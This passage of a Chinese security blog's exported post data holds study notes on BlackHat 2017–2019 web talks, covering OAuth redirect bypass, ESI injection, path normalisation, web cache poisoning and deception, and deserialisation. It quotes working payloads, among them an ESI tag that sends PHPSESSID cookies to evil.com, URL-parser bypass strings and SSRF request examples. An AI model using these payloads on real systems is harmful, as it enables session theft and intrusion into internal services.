EL表达式注入","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"EL注入","slug":"EL注入","permalink":"https://www.mi1k7ea.com/tags/EL注入/"}]},{"title":"BlackHat 2019 Web小结","date":"2020-04-19T17:16:00.000Z","path":"2020/04/20/BlackHat-2019-Web小结/","text":"0x00 前言最近整理下BlackHat 2019 Web相关议题，做下学习笔记。 0x01 Make Redirection Evil Again - URL Parser Issues in OAuthPDF： https://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Wang-Make-Redirection-Evil-Again.pdf http://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Wang-Make-Redirection-Evil-Again-wp.pdf 简介本议题主要介绍利用URL解析问题来绕过限制进行各种任意URL跳转攻击。 作者先介绍了什么是OAuth 2.0。OAuth（开放授权）是一个开放标准，允许用户授权第三方移动应用访问他们存储在另外的服务提供者上的信息，而不需要将用户名和密码提供给第三方移动应用或分享他们数据的所有内容，OAuth2.0是OAuth协议的延续版本，但不向后兼容OAuth 1.0即完全废止了OAuth1.0。 OAuth 2.0协议细节如图： 但是，如果OAuth 2.0登录时的重定向页面参数如上图的redirect_uri参数可被攻击者控制，那么将会造成任意URL跳转攻击： 针对这种攻击场景，开发者往往会采取一系列的校验措施，但是仅有校验完整的URL时才是无风险的，其他的校验方法会存在缺陷： 后面就看下几种绕过URL校验的技巧。 Evil Slash Trick（恶意反斜杠）如图，攻击者在redirect_uri参数中注入https://evil.com\\@good.com，该URL在服务端校验时解析的Host识别的是good.com并将该URL内容作为302重定向响应返回给浏览器，由于浏览器会将反斜杠转换为斜杠，因此在客户端实际访问的Host为evil.com： 这是因为大多数浏览器都会将/和\\视为路径分隔符，当用户在地址栏输入URL时，浏览器都是自动将\\替换成/。 Server Decoding Error（服务端解码错误）如图，攻击者在redirect_uri参数中注入https://evil.com%ff@good.com，这里%ff为超出ASCII范围的字符、并不是正常的URL编码内容，在服务端进行URL校验时由于解码错误导致识别的Host为good.com，当响应给浏览器重定向时该不可打印的字符被统一转换为了?，从而浏览器解析的时候被截断跳转到evil.com： Browser Decoding Error（浏览器解码错误）同上类似，不同之处在于用到%bf+:来组合使得浏览器URL解码错误，然后统一将不可见字符转换为?，从而绕过检测： Domain Matching+Prefix Matching（域名和前缀匹配）如图，服务端用startsWith()函数以及url.host来检测Host和前缀名；Host部分的绕过可以利用前面的反斜杠绕过；前缀部分的校验可以通过注册一个good.com.evil.com即包括前缀弱校验白名单作为子域名： Malformed Scheme（畸形的Scheme）如图，可以利用浏览器自动补全Scheme的特性，攻击者在redirect_uri参数中注入evil.com://good.com，服务端校验URL识别的是good.com，返回浏览器后URL被补全为https://evil.com://good.com从而成功绕过： IPv6 Address Parsing Bug（IPv6地址解析Bug）如图，某些URL解析器会将[]内的任何字符串视为IPv6主机而没有任何校验： 0x02 Preloading Insecurity In Your ElectronPDF： https://i.blackhat.com/asia-19/Thu-March-28/bh-asia-Carettoni-Preloading-Insecurity-In-Your-Electron.pdf https://i.blackhat.com/asia-19/Thu-March-28/bh-asia-Carettoni-Preloading-Insecurity-In-Your-Electron-wp.pdf Electron历史漏洞： https://www.freebuf.com/video/207509.html Electron基本安全测试指南： https://xz.aliyun.com/t/2461 简介Electron是Github开发的一个开源框架，它允许使用Node.js（作为后端）和Chromium（作为前端）完成桌面GUI应用程序的开发。Electron现已被多个开源Web应用程序用于前端和后端的开发，著名项目包括Github的Atom和微软的VSC。 本议题作者提出来一个新的漏洞类别，即：针对新版本的Electron应用，在没有Bypass nodeIntegration限制的情况下，可以通过BrowserWindow的Preload来扩展攻击面，实现绕过隔离来访问Node.js的原语，再次实现从XSS到RCE的攻击利用。 基本原理Electron的nodeIntegration属性是用来开启Node API访问权限的，默认不开启，因此XSS无法访问底层OS。但是Electron创建浏览器窗口时传入属性preload，preload属性能够在WebView内所有脚本执行之前先执行指定的脚本，preload环境可以使用Node API。 简单地说，和PHP中利用LD_PRELOAD绕过disable_function是异曲同工之妙。 具体的怎么利用看官方文档即可。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"BlackHat","slug":"BlackHat","permalink":"https://www.mi1k7ea.com/tags/BlackHat/"}]},{"title":"BlackHat 2018 Web小结","date":"2020-04-19T17:15:47.000Z","path":"2020/04/20/BlackHat-2018-Web小结/","text":"0x00 前言最近整理下BlackHat 2018 Web相关议题，做下学习笔记。 0x01 Edge Side Include Injection: Abusing Caching Servers into SSRF and Transparent Session Hijacking（ESI注入：滥用缓存服务器进行SSRF攻击和透明会话劫持）PDF： https://i.blackhat.com/us-18/Wed-August-8/us-18-Dion_Marcil-Edge-Side-Include-Injection-Abusing-Caching-Servers-into-SSRF-and-Transparent-Session-Hijacking.pdf https://i.blackhat.com/us-18/Wed-August-8/us-18-Dion_Marcil-Edge-Side-Include-Injection-Abusing-Caching-Servers-into-SSRF-and-Transparent-Session-Hijacking-wp.pdf 其他参考： https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection 浅析Edge Side Include注入（上） 浅析Edge Side Include注入（下） 何为ESIESI全称Edge Side Includes，是一种数据缓冲/缓存服务器，它提供将Web网页的部分（这里指页面的片段）进行缓冲/缓存的技术及服务。 ESI语言是基于XML标签的标记语言，用于改善HTTP中间件加载大量Web内容缓存时造成的性能下降。使用ESI标签可以指示反向代理服务器（或缓存服务器）获取已缓存Web页面模版的更多信息。传递给客户端的这些信息可能还来自另一台服务器（非后端服务器），该服务器可以完全缓存包含动态内容的页面。 如图，对于大型网站来说，页面很多部分其实都是静态的东西，部分是动态的比如天气信息等，网站为了提高性能将静态的内容缓存到前端的反向代理服务器中，将ESI指令发送给服务器端，然后在反向代理服务器进行内容的解析拼接后返回给浏览器： ESI Demo如下，使用ESI语言的”Include”在page1中包含page2并展示在页面中： 最终在浏览器端显示的是如下已经解析成功的内容，即用户访问page1的时候同时看到了page2的内容： 整个ESI语言解析流程如图： 当然，ESI语言也支持更多的常量来设置常用的变量值： ESI注入攻击原理由前面可知，ESI通过允许开发人员用ESI标签替换页面的动态部分来增加缓存灵活性。ESI标签在Web应用的服务端发送，在Web应用的代理服务器解析，这种看似不可控的模式难道不存在安全风险吗？ HTTP代理服务器无法区分后端服务器提供的合法ESI标签和HTTP响应中注入的恶意标签。也就是说，如果攻击者能够在HTTP响应中注入恶意ESI标签，那么代理服务器将会无差别地去解析和执行它们。 还是这个图，在第三步中，Web应用服务器给缓存服务器发送ESI语言，要求缓存服务器执行ESI语言，问题在于第一步客户端给Web应用服务器发送请求时，其中就插入了恶意ESI标签，这样的话到第三步的时候缓存服务器执行ESI语言时就会将恶意的ESI标签一并执行了： ESI注入攻击——SSRF如图，后端服务器将客户端传来的ESI标签payload传给代理服务器，代理服务器执行了ESI标签payload，并将完整的响应发送给了客户端： ESI注入攻击——绕过XSSFilter绕过XSSFilter的payload： &lt;esi:assign&gt;标签可以操作存储在服务端ESI变量中的任意值。$(变量名)操作符可以访问这个变量的值。 上述的注入在浏览器页面中实际返回如下，能成功绕过XSSFilter的过滤： 此外，某些服务器不支持ESI vars标签，此时可以通过SSRF来进行XSS攻击： ESI注入攻击——无JS窃取HttpOnly Cookie如下，PHP脚本中插入了ESI标签，该标签获取phpsessid值并输出在页面上，同时PHP会接收GET请求的city参数输出在页面上。这里使用&lt;esI:vars&gt;标签来输出Cookie常量即可实现无JS窃取这个HttpOnly Cookie： 进一步，可以使用ESI的include标签使得代理服务器把phpsessid发送给攻击者的服务器中： 1&lt;esi:include src=&quot;http://evil.com/?cookie=$(HTTP_COOKIE&#123;&apos;PHPSESSID&apos;&#125;)&quot; /&gt; 接着，在攻击者服务器的日志中就能接收到PHPSESSID了： 各应用支持情况 检测方法在项目中可使用同样的payload来测试是否支持ESI注入，当注入的ESI原样返回时，则存在问题： 也可以使用自动化扫描工具来发现： Burp ActiveScan++ Burp Upload Scanner Acunetix 0x02 Breaking Parser Logic: Take Your Path Normalization off and Pop 0days Out!PDF：https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf 路径归一化盲区一般的，在对外部输入字符串校验之前，需要使用java.text.Normalizer的normalize()方法先对其进行归一化（Unicode Normalization）处理。归一化可以确保具有相同意义的字符串具有统一的二进制描述。 但是归一化处理会存在一个问题，即Inconsistency，前后不一致。具体的说，就是路径检查器和路径解析器之间的解析存在不一致，从而导致存在安全问题，使得一些安全机制被绕过。 归一化的不一致表现在各个方面。 不同OS不一致如下是不同OS上表现的不一致，在Windows下会被解析为一个UNC地址，而在Linux下则是一个URL： 不同编码不一致在不同编码中表现不一致也存在一样的问题，比如代码不允许使用”secadmin”来查询数据库，但是如果数据库编码为utf8_general_ci（utf8_general_cs和utf8_bin均不行），则可以使用”ßecadmin”来绕过检测。 几个编码区别如下： utf8_general_ci：不区分大小写，这个你在注册用户名和邮箱的时候就要使用； utf8_general_cs：区分大小写，如果用户名和邮箱用这个 就会照成不后果； utf8_bin：字符串每个字符串用二进制数据编译存储。 区分大小写，而且可以存二进制的内容； 归一化顺序不同在某些开发场景中，会对外部传入的URL参数先调用过滤如..、/、\\等特殊字符的黑明单过滤函数进行过滤，再使用Normalizer.normalize()函数进行归一化处理。这种颠倒的顺序会导致容易被编码绕过。 ..\\Q/\\E你能看出getAsset()函数的安全问题吗？ Pattern.quote(str)函数返回值为\\Qstr\\E，\\Q代表字面内容的开始，\\E代表字面内容的结束，也就是说返回值使str没有任何正则表达式意义，即使其中含有正则表达式内容也被转变为字符串常量： 问题在哪看个例子就知道了： 123456789101112import java.io.File;import java.util.regex.Pattern;public class Test &#123; public static void main(String[] args) throws Exception &#123; String path = \"file:///root/../\\\\Q/\\\\Epasswd\"; String QUOTED_FILE_SEPARATOR = Pattern.quote(File.separator); String DIRECTIVE_FILE_SEPARATOR = \"/\"; path = path.replace(QUOTED_FILE_SEPARATOR, DIRECTIVE_FILE_SEPARATOR); System.out.println(path); &#125;&#125; Nginx斜杠绕过作者举的例子，路径/static被命中则会访问/home/app/static/下的资源文件，即相当于路径检查器；但是Nginx会自动在这种特殊路径../前加上斜杠，导致预设的路径/home/app/static/被穿越了： 此外，作者介绍了自己盲测的payload： 最终获取到非预设目录的其他文件： 出于这种思路，作者发现了如下CVE： 深入代码审计现存的应用Spring 0day - CVE-2018-1271这是个运行在Windows系统上的Spring路径穿越漏洞。 如图，如果传入的路径包含危险字符..就调用cleanPath()函数进行处理： cleanPath()函数的作用是将包含..的这种相对路径转换成绝对路径，比如/foo/bar/../经过处理后变成/foo/： 而该函数的问题在于第四行，其是允许空元素存在的。也就是说，cleanPath()函数会把//当成是一个目录，但是Windows系统是不会把//当成一个目录的，这就存在二义性问题了。 如下是作者测试时的payload对比结果： 通过这种不一致，实现Windows任意文件读取，payload如下： Rails 0day - CVE-2018-3760如图，在Rails这个Web框架中，当传入的URL中存在file://字符串时会被认为是绝对路径；随后使用URL编码来绕过双斜杠归一化；接着在split_file_uri()方法中对传入的URL进行解码： 如下，URL进来后，会调用forbidden_request()函数对传入的path进行检查： 在forbidden_request()函数中，如果path包含..则认为是危险路径： 如果请求中包含..即返回真，然后返回forbidden_response(env)信息： 如果传入的path没有包含危险字符..，那么继续跟踪会来到split_file_uri()函数，这里如果传入双重URL编码后的.最终会被解码，这就导致了前面的forbidden_request()函数形同虚设了： 最后，作者指出文件若是以.erb结尾，则会执行erb里面的命令，因此这是个RCE漏洞： 新的多层架构攻击面反向代理架构带来很多好处，比如资源共享、负载均衡、高速缓存、统一入口提高安全性等。 但是如果反向代理服务器遇到如下畸形URL时，它们的二义性将导致安全问题的产生： 当然，仅仅是开个玩笑而已： 危害主要是可以绕过黑白名单的ACL限制、逃逸上下文匹配等： 这个问题是在默认设置下发现的，也就是说如果用到了下面提到的反向代理模块就可能已经中招了： 在反向代理架构中，Tomcat对/..;/认知存在问题： 通过/..;/可以绕过ACL、逃逸到上级路径访问管理接口： 如下，有个管理后台需要登录认证才能访问： 通过测试观察发现，该站点是使用Nginx做反向代理服务器，使用Tomcat做后端服务器： 此时在URL中注入/..;/时，Nginx和Tomcat对该URL的认知就存在二义性： 利用二义性就能未授权访问修改密码页面了： 通过cmf或者后台界面样式，可以识别出基于Railo开发的管理台，Railo支持自定义模板，通过这个功能进一步取得shell权限： 0x03 WebAssembly: A New World of Native Exploits on the Browser（WebAssembly：浏览器漏洞的新世界）PDF： http://i.blackhat.com/us-18/Thu-August-9/us-18-Lukasiewicz-WebAssembly-A-New-World-of-Native_Exploits-On-The-Web.pdf http://i.blackhat.com/us-18/Thu-August-9/us-18-Lukasiewicz-WebAssembly-A-New-World-of-Native_Exploits-On-The-Web-wp.pdf 其他参考： WebAssembly的安全性问题–Part 1 WebAssembly的安全性问题–Part 2 简介WebAssembly是由W3C社区组开发的一项新技术。WebAssembly允许开发人员将他们本机的C/C++代码带到浏览器，代码由最终用户以接近本机的性能运行。WebAssembly已经在所有主流浏览器的最新版本中得到广泛支持，目前正在许多基于Web的服务中被使用。值得注意的例子包括3D模型渲染，界面设计和可视化数据处理。 WebAssembly仍处于开发的早期阶段，开发人员很可能会在未来发现新的用法。 WebAssembly(Wasm)是一种机器语言(可能应该被命名为“WebBytecode”)，被设计在有限的虚拟机上运行(想想JVM，而不是VMware)。然后可以将此虚拟机嵌入到其他程序(尤其是浏览器)中。Wasm虚拟机与程序或系统的其他部分隔离，只能通过特殊枚举的导入和导出与其宿主程序进行通信。大多数程序不会由作者直接在Wasm中编写，甚至也不会以用户友好的文本格式编写。其目标是把其他语言编译成Wasm。Wasm已经相对完整，可以让用户从低级语言中获得的许多功能。 Emscripten是目前最流行的WebAssembly编译器工具链，是Mozilla的Alon Zakai开发的一个独特LLVM后端，可以将任意LLVM中间码编译成JavaScript，大大简化了现有代码在Web时代的重用。简单地说，Emscripten就是可以把C/C++代码编译可执行代码在HTML上运行。 在本次议题中，作者介绍了在Emscripten上发现为增强WebAssembly而引入的新方法所带来的新漏洞，这些漏洞可以劫持控制流，甚至在网页上下文中执行任意JavaScript代码。 更多的解说看先知文章即可，这里没Demo也不copy了。 0x04 Practical Web Cache Poisoning: Redefining ‘Unexploitable’（缓存投毒攻击）PDF： http://i.blackhat.com/us-18/Thu-August-9/us-18-Kettle-Practical-Web-Cache-Poisoning-Redefining-Unexploitable.pdf PortSwigger官方博客参考： https://portswigger.net/research/practical-web-cache-poisoning Web缓存和投毒现在很多Web站点都使用了缓存技术来加速访问速度，比如浏览器本地缓存、DNS缓存等等。 如图，第一个用户访问a页面，第二、三个用户也访问a页面，缓存服务器会把第一个用户访问的a页面内容传给第二、三个用户： 那么问题来了，如何区分请求是不是同一个呢？这是缓存服务器需要继续解决的。不可能对请求的每一个字节都匹配校验，比如在不同浏览器请求同一个页面，就会造成User-Agent不同，但实际上这是需要返回缓存页面内容的： 此时，Cache Key出现了，缓存服务器通过标记某个位置来判断请求是否一致。如下图，通过请求接口URL和Host，在缓存服务器上算出一个Hash值，对于每个请求，如果请求接口URL和Host算出来的Hash值是同一个，则返回之前的缓存。此时会将用户A的访问数据传递给用户B，但实际上用户A和用户B的身份是不一样的： 作者指出，可以在返回报文头中使用Vary来告知客户端哪个是Cache Key的，但是实际测试过程中发现大型的CDN服务商都忽略了Vary。同时，他还发现了许多Web缓存服务器其实支持基于很多其他请求头来缓存页面内容，并且这些请求不在Cache Key的范围。换句话说，就是攻击者可以通过构造特殊请求头向缓存页面注入恶意内容。 如图，作者提出的一个查找Web缓存投毒攻击的攻击流程： 首先使用BurpSuite的扩展插件Param Miner对特殊请求头进行模糊查找，原理是使用高级差异逻辑和二进制搜索技术，可以为每个请求猜测多大65000个参数名，还可以收集捕获流量中其他的参数作为模糊查找的字典。这一步可以找出被测接口中可以注入恶意内容的特殊请求头。 当找到特殊请求头后就开始评估危害了，注入恶意代码到缓存服务器中，当受害者命中Cache规则时，缓存服务器会把相应的恶意缓存返回给受害者： 案例分析Basic PoisoningCache Key在X-Forwarded-Host头，注入点在响应内容的meta标签的content属性值中。 在检测阶段，发现关键的Cache Key是X-Forwarded-Host头： 接着进入评估和注入阶段，通过X-Forwarded-Host头注入XSS payload到缓存服务器上。此时当其他用户访问同样的URL时，都会受到XSS攻击： Discreet poisoningCache Key在X-Host头，注入点在响应内容的script标签的src属性值中： Selective Poisoning响应包的Vary头告知我们User-Agent头是作为Cache Key的一部分的。这意味着，由于我们声称使用的是Firefox 60，因此我们的漏洞利用将仅提供给其他Firefox 60用户，也就是说这种攻击场景更有选择性。 通过X-Forwarded-Host头注入在响应内容的link标签的href属性值中： DOM Poisoning如下，可以控制body标签的data-site-root属性值，但并不能进行XSS攻击，冰球不清楚该属性的用途。为了解决这个问题，作者在Burp中创建了一个匹配和替换规则，向所有请求添加了X-Forwarded-Host：id.burpcollaborator.net头，然后浏览了该站点。加载某些页面后，Firefox将JavaScript生成的请求发送到作者的服务器：： 上述URL路径表明，在网站上的某个地方，有JavaScript代码使用data-site-root属性来决定从何处加载某些国际化数据。作者试图通过获取https://catalog.data.gov/api/i18n/en来找出这些数据应该是什么样，但是只收到了一个空的JSON响应。幸运的是，将“ en”更改为“ es”给出了一个线索。该文件包含用于将短语翻译成用户所选语言的映射。通过创建自己的翻译文件并使用缓存中毒将用户指向该文件，我们可以将短语翻译为XSS payload从而实现XSS攻击： 其他更多的案例参考官方的PDF文档即可。 0x05 It’s a PHP Unserialization Vulnerability Jim, but Not as We Know It（不为人知的PHP反序列化漏洞）PDF： https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf 简介这个议题没啥好说的，就是phar反序列化漏洞，在《phar反序列化漏洞》中已经分析过了，而且很多CTF题目也出现过了，不再赘述。 0x06 Automated Discovery of Deserialization Gadget Chains（反序列化Gadget链自动发掘）PDF： https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains-wp.pdf 简介作者对已有的反序列化漏洞利用工具进行了调研分析，其中ysoserial主要是针对某些特定库以及JDK ObjectInputStream的漏洞利用，但是对于非标准库的场景就没法利用了。作者针对Java提出了一种可自动发现反序列化工具链的技术，并研发了基于Java字节码发掘反序列化Gadget链的工具Gadget Inspector。 工具地址：https://github.com/JackOfMostTrades/gadgetinspector 在研发过程中，作者枚举war包中类、方法的层次关系，发掘了直通数据流和调用图，并在此基础上使用已知的tricks枚举了可能源，最后在数据流的调用图中使用BFS算法发掘Gadget链。在性能表现上，Gadget Inspector支持对最受欢迎的前100个Java库的检测，并且在检测效果中可以发掘一些最新的Gadget链。虽然有少量的误报，但这些误报大多来自反射链。 该工具后面会深入研究，这里先不浅谈了。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"BlackHat","slug":"BlackHat","permalink":"https://www.mi1k7ea.com/tags/BlackHat/"}]},{"title":"BlackHat 2017 Web小结","date":"2020-04-19T06:43:43.000Z","path":"2020/04/19/BlackHat-2017-Web小结/","text":"0x00 前言最近整理下BlackHat 2017 Web相关议题，做下学习笔记。 0x01 WEB CACHE DECEPTION ATTACK（Web缓存欺骗攻击）PDF：https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack.pdf 相关参考：一种新型的Web缓存欺骗攻击技术 攻击原理 先简单介绍一下WEB缓存技术，它主要是缓存一些静态的，公开的文件，如CSS文件，JS文件，图片等。缓存分两类，一类是本地缓存，通过在浏览器上缓存实现，缓存之后通过F5刷新是不会重新获取已缓存文件的，通过Ctrl +F5强制刷新才会重新获取。另一类是在服务端实现，也就是在CDN、负载均衡、反向代理（后面统称缓存服务器）上实现，这次介绍的攻击技术就是针对这一种缓存。服务端的缓存原理是：客户端请求一个静态文件，如果缓存服务器没有缓存过这个文件，就会像WEB服务器请求，获取到静态文件返回给客户端，同时将这个文件缓存下来，下次再遇到同样的请求时就直接返回，直到这个缓存文件过期。 接下来讲一下WEB服务器解析的问题。假设客户端请求http://www.example.com/home.php/nonexistent.css 这个URL，其中home.php是真实存在的，而nonexistent.css不存在，那WEB服务器会怎么处理呢？针对这种情况的处理跟WEB服务器用的技术以及配置相关，有的会返回404 not found，有的会返回200 OK，然后把home.php返回回来。如果服务器返回200 OK就要注意了，这时缓存服务器拿到的请求是http://www.example.com/home.php/nonexistent.css，是一个静态页面，而WEB服务器返回给缓存服务器的结果是http://www.example.com/home.php，不是一个静态页面，但是缓存服务器并不知道。 攻击原理如图： 攻击者引诱已登录的用户（受害者）访问https://www.bank.com/account.do/logo.png 受害者请求https://www.bank.com/account.do/logo.png 缓存服务器接收到请求，没查到这个页面，于是向WEB服务器请求 WEB服务器返回https://www.bank.com/account.do，状态码是200 OK 缓存服务器收到结果，由于状态码是200 OK，会认为URL保持不变，然后由于这个URL以.png结尾，认为它是一个静态文件，于是会缓存这个文件 受害者得到正常结果 攻击者访问https://www.bank.com/account.do/logo.png，请求到达缓存服务器，缓存服务器直接返回受害者的缓存账户页面给攻击者，攻击完成。 防御方法： 配置缓存服务器根据http header来判断是否缓存页面； 将所有静态文件放在指定的目录，只缓存这个目录里的文件； 配置WEB服务器在解析类似http://www.example.com/home.php/nonexistent.css 这种页面时返回404或者302。 更多的看参考文章即可。 0x02 CRACKING THE LENS: TARGETING HTTP’S HIDDEN ATTACK-SURFACE（HTTP的隐藏攻击面）PDF：https://www.blackhat.com/docs/us-17/wednesday/us-17-Kettle-Cracking-The-Lens-Exploiting-HTTPs-Hidden-Attack-Surface.pdf PortSwigger博客参考：https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface 简介访问Web站点通常会经过许多隐藏的服务系统（包括反向代理、负载均衡器、后端分析系统等），这些系统主要用来提升用户体验、提取统计数据或提供其他服务等。正因为其隐藏的特点，导致这一层不可见的攻击面被忽略了很久。 作者使用畸形请求和特殊HTTP头是隐藏系统暴露自己，并打开了攻击内网的大门。其中，作者分享了几个隐藏系统的漏洞案例，包括Yahoo的若干服务器、拦截篡改细腻的英国ISP（BT）、哥伦比亚的ISP，将反射型XSS升级为SSRF的军方服务器等。 攻击方法Listening监听隐藏系统本身被设计为隐藏的、外部无感知的，因此无法通过响应报文来识别它们的漏洞。可以通过发送特殊的报文来让这些系统主动连接我们，然后分析产生的DNS lookup和HTTP请求，识别可能存在的漏洞。 作者使用Burp Collaborator记录了这些请求，但也可以会用自己的DNS服务器，或者使用CanaryTokens。 Research Pipeline作者首先使用简单的Burp匹配/替换规则将硬编码的pingback payload注入到所有浏览器流量中。这种方法以失败告终，因为有效负载造成了如此多的pingback，以致于很难将每个单独的pingback相关联并确定哪个网站触发了它。很快也很明显，某些有效负载会在三分钟，几小时甚至每24小时一次的延迟后引起pinging。 为了有效地对pingback进行分类，作者写了Collaborator Everywhere，这是一个简单的Burp扩展，它将包含唯一标识符的payload注入所有代理流量中，并使用它们自动将pingback与相应的攻击相关联。如下图，Netflix在作者访问其网站四个小时后访问了Referer标头中指定的URL，并假装是在x86 CPU上运行的iPhone： Scaling up扩大攻击面测试目标域名和IP地址是从合法的漏洞奖励计划网站中筛选的。 为使发出的报文尽可能触发漏洞，HTTP头处理如下： Host头带多个hostname； 设置X-Forwarded-Proto头，标识Client与代理服务器之间使用的协议； 设置Cache-Control头为no-transform，禁止中间代理服务器处理请求报文； 设置Max-Forwards最大转发次数； 案例——Misrouting Requests攻击者通过特殊的Host头来操控反向代理服务器向攻击者指定的目标发送请求，可以理解为使SSRF的变种。 反向代理服务器在组网中用于连接外网和内网，这就导致其有被SSRF利用的风险。 Invalid Host触发回调的最简单方法是发送不正确的HTTP Host标头： 123GET / HTTP/1.1Host: uniqid.burpcollaborator.netConnection: close 成功利用的案例： 27 DoD servers ats-vm.lorax.bf1.yahoo.com My ISP Colombian ISP doing DNS poisoning 这里看下作者对ats-vm.lorax.bf1.yahoo.com的利用 一开始还不清楚服务端运行的是什么应用软件： 12GET / HTTP/1.1Host: XX.X.XXX.XX:8082 接着，通过HELP命令得知了服务端运行的应用软件信息： 12HELP / HTTP/1.1Host: XX.X.XXX.XX:8082 来自服务器的众多“Unknown Command”将请求的每一行解释为单独的命令-它使用的是换行符终止的协议，这将使通过经典SSRF进行利用变得极为困难或不可能。 但幸运的是，基于路由的SSRF更加灵活，能够使用包含选择的命令的POST样式的主体发出GET请求： 12345678910GET / HTTP/1.1Host: XX.X.XXX.XX:8082Content-Length: 34GET proxy.config.alarm_emailHTTP/1.1 200 Connection EstablishedDate: Tue, 07 Feb 2017 16:57:02 GMTTransfer-Encoding: chunkedConnection: keep alive 之后，再使用SET命令就可以对Yahoo的负载均衡器池进行广泛的配置更改，包括启用SOCKS代理并授予我的IP地址权限，以将项目直接推送到其缓存中。 Handling input permutation作者在测试中遇到个别服务器收到下面这个请求后： 123GET / HTTP/1.1Host: burpcollaborator.netConnection: close 会转发出这样的请求，即Host值放入URL中拼接两次作为URL Path，同时Host值加了outage前缀： 123GET /burpcollaborator.net/burpcollaborator.net HTTP/1.1Host: outage.burpcollaborator.netVia: o2-b.ycpi.tp2.yahoo.net 如何利用？——注册域名到内网地址，实现向内网发送请求。此外，还有vcap.me，这是一个公开的域名，其所有子域名都会被解析为127.0.0.1，再利用../跨路径，实现对内网http://127.0.0.1的访问。 那么，构造的利用请求报文如下即可： 服务端在归一化处理后得到的请求为http://outage.vcap.me/?x=.vcap.me，等同于http://127.0.0.1/的访问。 Host overriding在URI中的Host可以替换为Host头的值。 有些服务器会对Host头的值进行校验，但会忽视利用URI也可以传递Host头值并且比Header的优先级更高。 123GET http://internal-website.mil/ HTTP/1.1Host: xxxxxxx.milConnection: close Ambiguous requests含糊不清的请求，即会引起歧义的请求。 通过username:pass@domainname的形式来混淆域名，incapsula防火墙通过端口号来提取域名，如下面的Host头的值，防火墙认为端口号是80，域名为incapsula-client.net（合法），但实际请求转发到目标服务器后解析获取的URL为burp-collaborator.net： 123GET / HTTP/1.1Host: incapsula-client.net:80@burp-collaborator.netConnection: close Breaking expectations还可以在URI中传递不以/开头、包含@的路径来混淆URL。 1234567891011121314Url backendURL = &quot;http://public-backend/&quot;;String uri = ctx.getRequest().getRawUri();URI proxyUri;try &#123;proxyUri = new URIBuilder(uri) .setHost(backendURL.getHost()) .setPort(backendURL.getPort()) .setScheme(backendURL.getScheme()) .build();&#125; catch (URISyntaxException e) &#123; Util.sendError(ctx, 400, INVALID_REQUEST_URL); return;&#125; 对上述处理，使用下面请求报文，实际得到的URL域名被攻击者替换为了http://public-backend@burp-collaborator.net： 123GET @burp-collaborator.net/ HTTP/1.1Host: newrelic.comConnection: close Tunnels去掉@后的URL变形，观察会不会有服务器向xyz.burpcollaborator.net发送请求： 123GET xyz.burpcollaborator.net:80/bar HTTP/1.1Host: demo.globaleaks.orgConnection: close 收到了globaleaks.org服务器怪异的请求，多次pingback： 123xYZ.BurpcoLLABoRaTOR.neT. from 89.234.157.254Xyz.burPColLABorAToR.nET. from 62.210.18.16 xYz.burpColLaBorATOR.net. from 91.224.149.254 经分析发现，跟globaleaks使用的Tor2web做隐匿请求的处理有关。 案例——Targeting auxiliary systems此外，还可以关注相关备用系统的利用。 Gathering information收集信息。除了Host头，其他头字段也能被利用： 1234567GET / HTTP/1.1Host: store.starbucks.caX-Forwarded-For: a.burpcollaborator.netTrue-Client-IP: b.burpcollaborator.netReferer: http://c.burpcollaborator.net/X-WAP-Profile: http://d.burpcollaborator.net/wap.xmlConnection: close 具体几个头字段的利用看作者博客即可。 Pre-emptive caching预缓存。 看个将反射型XSS提升至SSRF的案例。一个军方的服务器有预缓存的行为： 12GET / HTTP/1.1Host: burpcollaborator.net 随后收到如下请求： 12GET /jquery.js HTTP/1.1GET /abrams.jpg HTTP/1.1 缓存服务器收到&lt;img src=&quot;/a.jpg&quot;/&gt;这样的内容时，会拿Host头发出这样的请求来预加载资源：http://burpcollaborator.net/a.jpg 作者在后端应用中找到一个反射型XSS，注入一段访问内网服务器上的图片的语句： 12345POST /xss.cgi HTTP/1.1Content-Length: 103Connection: closexss=&lt;img src=&quot;http://internal-server.mil/index.php/fake.jpg&quot;/&gt; 然后缓存服务器将缓存它并可从外网访问： 123GET /index.php/fake.jpgHost: internal-server.milConnection: close 整个攻击过程如图： 0x03 JSON ATTACKSPDF：https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf 简介本次议题讲的就是JSON库反序列化漏洞及其Gadgets的内容。其中包括Fastjson、Jackson等反序列化漏洞的研究，基本原理这些这里不再赘述，只对一些JSON反序列化Tips进行记录即可。 JSON如果只传递简单对象，一般是安全的。但是如果传递的是Java对象或者.NET对象，则会容易存在安全问题。 Java反序列化和.NET BinaryFormat反序列化容易被攻击，这是因为它们在处理过程中会调用一系列的回调函数，而这些回调函数如果存在危险调用或操作则就造成了反序列化漏洞的存在。整个攻击可归结为攻击者能够控制反序列化对象图中的对象类型，而该类型的反序列化回调逻辑可以被利用来执行任意代码。 反序列化对象图，类似于HTML页面的DOM树，DOM树包含一系列的标签，标签间有层次关系。要反序列化的对象可能继承于某个类型、可以有多种类型的成员变量，这些被包含的对象又有类型的结构，展开就像DOM树一样也是一张图，被称为对象图。 